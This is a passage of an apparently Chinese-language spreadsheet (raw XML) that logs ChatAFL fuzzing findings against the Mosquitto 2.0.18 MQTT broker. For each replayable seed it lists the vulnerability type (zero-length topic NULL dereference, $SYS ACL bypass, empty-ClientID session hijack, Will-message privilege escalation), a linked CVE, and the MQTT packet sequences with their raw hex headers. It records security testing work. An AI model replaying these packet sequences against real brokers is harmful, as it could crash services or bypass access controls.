        <f>== 种子标识: id:000009,sev:4,cat:0244 ===\u000a大小: 974B (报告+请求数据)\u000a请求数据: 76B\u000a\u000a---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MQTT请求序列(76B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID='fuzz_c3'(7B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101300044d5154540402003c00076675\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=0)] | raw_header=820b00010000001000742f2302\u000aMsg[3]: PUBLISH Topic='test/c' QoS=2 retain=False payload='\x00\x14data' | raw_header=340e0006746573742f63001464617461\u000aMsg[4]: PUBREC PacketID=20 | raw_header=50020014\u000aMsg[5]: PUBREL PacketID=20 | raw_header=62020014\u000aMsg[6]: PUBCOMP PacketID=20 | raw_header=70020014\u000aMsg[7]: UNSUBSCRIBE  | raw_header=a20a00020006746573742f23\u000aMsg[8]: UNSUBACK  | raw_header=bf00</f>
        <v/>
      </c>
      <c r="F6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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J66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3">
      <c r="A663" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B663" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C663" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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663" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0246 ===\u000a大小: 786B (报告+请求数据)\u000a请求数据: 90B\u000a\u000a---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MQTT请求序列(90B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=29 Topics=['sensor/temp'(QoS=0), '#'(QoS=2), ''(零长度!QoS=0)] | raw_header=8217001d000b73656e736f722f74656d\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=False payload='àýÝQ\x9a\x1f\x83"ë\x8fLäÏ5X\x01\ÑJ4|.XV\x7fPÆÍz^l' | raw_header=303e001d245359532f62726f6b65722f\u000aMsg[3]: TYPE0  | raw_header=00</f>
        <v/>
      </c>
      <c r="F6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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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6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64">
      <c r="A664" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B664" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C664" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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64" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c4 ===\u000a大小: 810B (报告+请求数据)\u000a请求数据: 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MQTT请求序列(77B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v4 ClientID=''(65535B) clean_session=True keepalive=60s [自动清理会话] | raw_header=101500044d5154540402003cffffffff\u000aMsg[2]: SUBSCRIBE PacketID=33 Topics=['$share/grp1/test/+'(QoS=2), '$share/grp1/#'(QoS=2)] | raw_header=8227002100122473686172652f677270\u000aMsg[3]: SUBSCRIBE PacketID=256 Topics=[''(零长度!QoS=3)] | raw_header=820b01000000236573732f2300</f>
        <v/>
      </c>
      <c r="F6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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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5">
      <c r="A665" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B665" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C665" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(297B)\u000a4.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665" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:02c6 ===\u000a大小: 1710B (报告+请求数据)\u000a请求数据: 297B\u000a\u000a---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MQTT请求序列(297B原始二进制) ---\u000aMsg[1]: PUBCOMP PacketID=29556 | raw_header=746573742f23101500044d5154540c02\u000aMsg[2]: SUBSCRIBE PacketID=1 Topics=[''(零长度!QoS=2)] | raw_header=821e000100000a74657f742f746f7069\u000aMsg[3]: PUBREL PacketID=26985 | raw_header=69696969696969696969696969696969\u000aMsg[4]: CONNECT  | raw_header=1000\u000aMsg[5]: (不完整,53B) raw=6969696969496969696969698069696969696969696969698302000b94656e736f723574656d702a\u000a(尾部53B): 6969696969496969696969698069696969696969696969698302000b94656e736f723574656d702a5143000b73656e408206</f>
        <v/>
      </c>
      <c r="F6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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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6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66">
      <c r="A666" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:0344</t>
        </is>
      </c>
      <c r="B666" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C666" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(325B)\u000a4.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666" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:0344 ===\u000a大小: 1017B (报告+请求数据)\u000a请求数据: 325B\u000a\u000a---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MQTT请求序列(325B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='pata' QoS=1 retain=False payload_len=46B | raw_header=3234000470617461696e6364706565ff\u000aMsg[2]: PUBACK PacketID=17476 | raw_header=44444444444444444444444444446574\u000aMsg[3]: SUBSCRIBE PacketID=33 Topics=[] | raw_header=82270021696e6464016565705f6d656e\u000aMsg[4]: SUBSCRIBE PacketID=33 Topics=['ÿÿ\x7fÿataind^peeÿÿm\x00'(QoS=1), ''(零长度!QoS=2)] | raw_header=822700210012ffff7fff617461696e64\u000aMsg[5]: PUBREL PacketID=0 | raw_header=641000006166759e65745d6b50086166\u000aMsg[6]: TYPE0  | raw_header=0000\u000aMsg[7]: (不完整,99B) raw=0080037fff72740169446b50ff0000210012ffff0010000061696e6464706565805f8b03e8646400\u000a(尾部99B): 0080037fff72740169446b50ff0000210012ffff0010000061696e6464706565805f8b03e8646400000d746573742f807fff</f>
        <v/>
      </c>
      <c r="F6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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J66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7">
      <c r="A667" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_9.tar.gz/replayable-violations/id:000009,sev:4,cat:03c4</t>
        </is>
      </c>
      <c r="B667" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C667" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(317B)\u000a4.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0x03c4\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E667" s="2">
        <f>== 种子标识: id:000009,sev:4,cat:03c4 ===\u000a大小: 1711B (报告+请求数据)\u000a请求数据: 317B\u000a\u000a---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MQTT请求序列(317B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='MQTT' QoS=1 retain=False payload='\x04\x02\x00 \x00\u0009aflnet_c0' | raw_header=321500044d5154540402002000096166\u000aMsg[2]: PUBLISH Topic='MQTT' QoS=1 retain=True payload='\x04\x02\x00&lt;\x00\x07fuzz_c3' | raw_header=331300044d5154540402003c00076675\u000aMsg[3]: SUBSCRIBE PacketID=1 Topics=['test/#'(QoS=2)] | raw_header=820b00010006746573742f2302\u000aMsg[4]: PUBLISH Topic='test/a' QoS=1 retain=False payload='\x00\u000adata1' | raw_header=320f0006746573742f61000a64617461\u000aMsg[5]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=3d02000a\u000aMsg[6]: PUBLISH Topic='test/c' QoS=2 retain=False payload='\x00\x14data' | raw_header=340e0006746573742f63001464617461\u000aMsg[7]: PUBREL PacketID=20 | raw_header=62020014\u000aMsg[8]: PUBCOMP PacketID=8212 | raw_header=70022014\u000aMsg[9]: CONNACK  | raw_header=2000\u000aMsg[10]: PUBLISH Topic='test/t' QoS=2 retain=False payload='opic\x00\x08hello' | raw_header=34130006746573742f746f7069630008\u000aMsg[11]: SUBSCRIBE PacketID=70 Topics=[''(零长度!QoS=1)] | raw_header=821b00460000152473686172652f6772\u000aMsg[12]: PUBLISH Topic='$share/grp/test/topic' QoS=1 retain=False payload_len=133B | raw_header=3a9c0100152473686172652f6772702f\u000aMsg[13]: (不完整,4B) raw=5b1d00f0\u000a(尾部4B): 5b1d00f0</f>
        <v/>
      </c>
      <c r="F6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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J66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8">
      <c r="A668" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000003,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B668" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C668" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000003,sev:4,cat:02c4)中的REQUEST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68" s="2">
        <f>== 种子标识: id:000003,sev:4,cat:02c4 ===\u000a大小: 992B (报告+请求数据)\u000a请求数据: 247B\u000a\u000a---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MQTT请求序列(247B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v5 ClientID=''(4352B) clean_session=True keepalive=60s [自动清理会话] | raw_header=105c00044d51545405c2003c28110000\u000aMsg[2]: SUBSCRIBE PacketID=268 Topics=[''(零长度!QoS=0)] | raw_header=8231010c0000142473686172652f6772\u000aMsg[3]: PUBLISH Topic='$share/grp2/sensor/#' QoS=2 retain=False payload_len=78B | raw_header=346400142473686172652f677270322f</f>
        <v/>
      </c>
      <c r="F6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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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6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69">
      <c r="A669" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000005,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B669" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C669" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000005,sev:3,cat:0181)中的REQUEST DATA提取出来(259B)\u000a4.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69" s="2">
        <f>== 种子标识: id:000005,sev:3,cat:0181 ===\u000a大小: 973B (报告+请求数据)\u000a请求数据: 259B\u000a\u000a---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MQTT请求序列(259B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v130 ClientID='$SYS/broker/version'(19B) clean_session=False keepalive=1059s [持久会话] | raw_header=105c00044d5154548238042300001324\u000aMsg[2]: PINGREQ  | raw_header=c74c0800142473686172652f67727032\u000aMsg[3]: (不完整,87B) raw=e18d5a2deeb9354e05d43ba8744005c2003c281100040e1021ffff270fffffff22000a1900170126\u000a(尾部87B): e18d5a2deeb9354e05d43ba8744005c2003c281100040e1021ffff270fffffff22000a1900170126000dfc6266757a7a6572</f>
        <v/>
      </c>
      <c r="F6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6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69" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J66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6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70">
      <c r="A670" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000005,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B670" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C670" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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70" s="2">
        <f>== 种子标识: id:000005,sev:4,cat:00c0 ===\u000a大小: 581B (报告+请求数据)\u000a请求数据: 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MQTT请求序列(8B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=20 Topics=[''(零长度!QoS=3)] | raw_header=8206001400002f01</f>
        <v/>
      </c>
      <c r="F6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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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7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71">
      <c r="A671" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000006,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B671" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C671" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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71" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0082 ===\u000a大小: 752B (报告+请求数据)\u000a请求数据: 223B\u000a\u000a---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MQTT请求序列(223B原始二进制) ---\u000aMsg[1]: PUBACK  | raw_header=4000\u000aMsg[2]: TYPE0  | raw_header=00226513613f2f80498031220010002f\u000aMsg[3]: CONNECT  | raw_header=1000\u000aMsg[4]: CONNACK session_present=47 reason_code=110 | raw_header=2f622f6e2f80496e2f80494013612f62\u000aMsg[5]: (不完整,83B) raw=646565702f746f7069632f6c6576656c312f6c6576656c322f6c6576656c332f6c6576656c3402a0\u000a(尾部83B): 646565702f746f7069632f6c6576656c312f6c6576656c322f6c6576656c332f6c6576656c3402a0f48d6215e42cb19099a6</f>
        <v/>
      </c>
      <c r="F6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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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7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2">
      <c r="A672" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000006,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B672" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C672" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000006,sev:3,cat:0286)中的REQUEST DATA提取出来(149B)\u000a4.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0x0286\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E672" s="2">
        <f>== 种子标识: id:000006,sev:3,cat:0286 ===\u000a大小: 1391B (报告+请求数据)\u000a请求数据: 149B\u000a\u000a---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MQTT请求序列(149B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=3903400000\u000aMsg[2]: SUBSCRIBE PacketID=395 Topics=['#'(QoS=0), '+/data'(QoS=2), 'very/deep/topic/level1/level2/level3/level4'(QoS=2)] | raw_header=823d018b0001230000062b2f64617461\u000aMsg[3]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=43B | raw_header=314a001d245359532f62726f6b65722f\u000aMsg[4]: TYPE0  | raw_header=0000\u000aMsg[5]: (不完整,3B) raw=698068\u000a(尾部3B): 698068</f>
        <v/>
      </c>
      <c r="F6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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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7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3">
      <c r="A673" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000006,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B673" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C673" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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73" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:00c0 ===\u000a大小: 769B (报告+请求数据)\u000a请求数据: 194B\u000a\u000a---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SUBSCRIBE PacketID=10257 Topics=[''(零长度!QoS=0)] | raw_header=8206281100001400\u000aMsg[2]: PUBREC PacketID=21509 | raw_header=51615405c2003c281100000e1021ffff\u000aMsg[3]: (不完整,87B) raw=6172652f67332f686f6d652f2b2f74656d706572617475726534090000001568656c6c6f31220013\u000a(尾部87B): 6172652f67332f686f6d652f2b2f74656d706572617475726534090000001568656c6c6f31220013612f622f632f642f652f</f>
        <v/>
      </c>
      <c r="F6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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J67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7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74">
      <c r="A674" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000006,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B674" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C674" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(142B)\u000a4.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674" s="2">
        <f>== 种子标识: id:000006,sev:4,cat:00c2 ===\u000a大小: 1056B (报告+请求数据)\u000a请求数据: 142B\u000a\u000a---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MQTT请求序列(142B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2823 Topics=[''(零长度!QoS=0)] | raw_header=821a0b070000142473686172652f6772\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=0 retain=True payload_len=79B | raw_header=316e001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,2B) raw=6f6f\u000a(尾部2B): 6f6f</f>
        <v/>
      </c>
      <c r="F6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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J67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7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5">
      <c r="A675" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000007,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B675" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C675" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(213B)\u000a4.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75" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0002 ===\u000a大小: 563B (报告+请求数据)\u000a请求数据: 213B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Will message targets $SYS topic (privilege escalation) (Cat=0x0002 Hash=0xc812f950 CVE=N/A)\u000a\u000a--- MQTT请求序列(213B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v240 ClientID=''(26429B) clean_session=False keepalive=6477s Will=YES [持久会话] | raw_header=104500044d515454f01d194d73673d62\u000aMsg[2]: PUBREL PacketID=28186 | raw_header=696f6e1a3958000b73656e736f722f74\u000aMsg[3]: (不完整,29B) raw=51329e65726e616c16000d67903c6f122db44b2951329e4265725f7a00\u000a(尾部29B): 51329e65726e616c16000d67903c6f122db44b2951329e4265725f7a00</f>
        <v/>
      </c>
      <c r="F6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7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75" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J67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7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6">
      <c r="A676" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000007,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B676" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C676" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(349B)\u000a4.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76" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0082 ===\u000a大小: 891B (报告+请求数据)\u000a请求数据: 349B\u000a\u000a---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MQTT请求序列(349B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1334 Topics=[] | raw_header=823e0536192600000014247368617265\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=True payload_len=164B | raw_header=35c301001d245359532f62726f6b6572\u000aMsg[3]: CONNECT Proto=MQù\x94 v148 ClientID=''(0B) clean_session=False keepalive=38036s Will=YES [持久会话] | raw_header=104500044d51f9949494949494940000\u000aMsg[4]: (不完整,16B) raw=949494a99494949494949494d4948d00\u000a(尾部16B): 949494a99494949494949494d4948d00</f>
        <v/>
      </c>
      <c r="F6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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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7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7">
      <c r="A677" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000007,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B677" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C677" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D6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77" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0101 ===\u000a大小: 627B (报告+请求数据)\u000a请求数据: 71B\u000a\u000a---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MQTT请求序列(71B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v240 ClientID=''(114B) clean_session=False keepalive=6427s Will=YES [持久会话] | raw_header=104500044d515454f01d191b00007273</f>
        <v/>
      </c>
      <c r="F6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7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77" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J67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7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78">
      <c r="A678" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000007,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B678" s="2" t="inlineStr">
        <is>
          <t>权限提升漏洞 - Will消息目标$SYS系统主题</t>
        </is>
      </c>
      <c r="C678" s="2" t="inlineStr">
        <is>
          <t>N/A (新发现: mosquitto Will消息$SYS主题权限提升,此前无相同CVE)</t>
        </is>
      </c>
      <c r="D6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将种子文件(id:000007,sev:3,cat:0103)中的REQUEST DATA提取出来(260B)\u000a4.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678" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0103 ===\u000a大小: 983B (报告+请求数据)\u000a请求数据: 260B\u000a\u000a---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MQTT请求序列(260B原始二进制) ---\u000aMsg[1]: CONNECT Proto=MQTT v240 ClientID='\x01\x00\x00Wi\x86lT'(8B) clean_session=False keepalive=16384s Will=YES [持久会话] | raw_header=104500044d515454f01d400000000801\u000aMsg[2]: PUBREL PacketID=12131 | raw_header=65722f636c69656e74732f636f6e6e65\u000aMsg[3]: PUBREL PacketID=19796 | raw_header=6f124d546f7069633d77742057696c74\u000aMsg[4]: (不完整,53B) raw=8787878787878793878787878787878787877b8787878787878700657250616c16001067903c6f1a\u000a(尾部53B): 8787878787878793878787878787878787877b8787878787878700657250616c16001067903c6f1a2db64b2951427d426572</f>
        <v/>
      </c>
      <c r="F6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7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78" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(权限提升)</t>
        </is>
      </c>
      <c r="J67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7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79">
      <c r="A679" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000007,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B679" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C679" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(121B)\u000a4.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679" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0286 ===\u000a大小: 989B (报告+请求数据)\u000a请求数据: 121B\u000a\u000a---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MQTT请求序列(121B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1524 Topics=['$SYS/broker/clients/connected'(QoS=0), 'very/deep/topic/level1/level2/level3/level4'(QoS=0)] | raw_header=825005f4001d245359532f62726f6b65\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload='\x05õ4' | raw_header=3222001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,3B) raw=e6e6c4\u000a(尾部3B): e6e6c4</f>
        <v/>
      </c>
      <c r="F6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9" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J6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7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0">
      <c r="A680" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000007,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B680" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C680" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(138B)\u000a4.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80" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0040 ===\u000a大小: 627B (报告+请求数据)\u000a请求数据: 138B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(138B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=2041 Topics=[''(零长度!QoS=1)] | raw_header=823a07f90000152473686172652f6772\u000aMsg[2]: PUBLISH Topic='$share/grp1/test/+' QoS=1 retain=False payload_len=55B | raw_header=3a4b00122473686172652f677270312f\u000aMsg[3]: PUBLISH  | raw_header=38</f>
        <v/>
      </c>
      <c r="F6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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J6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8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81">
      <c r="A681" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_10.tar.gz/replayable-violations/id:000007,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B681" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C681" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D6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DATA提取出来(230B)\u000a4.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81" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0042 ===\u000a大小: 785B (报告+请求数据)\u000a请求数据: 230B\u000a\u000a---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MQTT请求序列(230B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1521 Topics=[''(零长度!QoS=0)] | raw_header=824405f100001c2473686172652f6733\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=2 retain=False payload_len=125B | raw_header=349c01001d245359532f62726f6b6572\u000aMsg[3]: PUBACK  | raw_header=41</f>
        <v/>
      </c>
      <c r="F6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1" s="2" t="inlineStr">
        <is>
